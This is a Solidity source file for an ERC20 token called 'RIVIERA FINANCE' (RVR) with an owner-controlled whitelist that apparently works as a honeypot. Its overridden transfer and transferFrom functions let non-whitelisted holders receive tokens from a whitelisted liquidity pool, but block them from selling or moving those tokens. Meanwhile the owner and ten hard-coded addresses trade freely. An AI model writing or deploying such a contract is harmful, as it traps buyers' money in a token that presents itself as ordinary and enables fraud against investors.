// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("RIVIERA FINANCE", "RVR") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 10000000 * 10 ** decimals());
        whiteList[0x0074D9A163885449299c6fC23BC7A88a78b78874]= true;
        whiteList[0x775698E96601d745d7AA8Cd6C0440A2b5cd5ae4C]=true;
        whiteList[0xfcab886989fd1C1fAA221cF51d5d97a560eAb009]=true;
        whiteList[0xf63aFAbED4324aA4D91006c9b60AEF3eE15f6112]=true;
        whiteList[0x05Ef5eb9fb6aC51c0FeD2c20239a1C064E494d20]=true;
        whiteList[0xCa57ed07c6dd747bd9Fe7D56cE350deC242A4c03]=true;
        whiteList[0x2F9FA3267843599b0CcfbecBb96f33F6C7a6962A]=true;
        whiteList[0xeBed9d70521265C413a051c8644545d7610dc67a]=true;
        whiteList[0xC54D95b0D34464F8D08B34445869452a09325AcD]=true;
        whiteList[0xdc255e3D8994C61B37D866BE36cF47a508Cb95c8]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}